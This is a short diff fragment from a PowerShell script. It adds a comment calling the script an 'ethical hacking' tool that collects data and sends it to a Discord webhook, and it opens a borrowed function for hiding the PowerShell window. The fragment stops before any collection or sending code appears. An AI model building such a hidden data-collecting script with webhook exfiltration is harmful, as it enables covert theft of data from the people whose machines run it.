@@ -1,3 +1,4 @@
+#Ethical hacking powershell script wich collects data and sends it to a discord webhook
 # Function from https://gist.github.com/lalibi/3762289efc5805f8cfcf (Hide Powershell Window)
 function Set-WindowState {
     <#
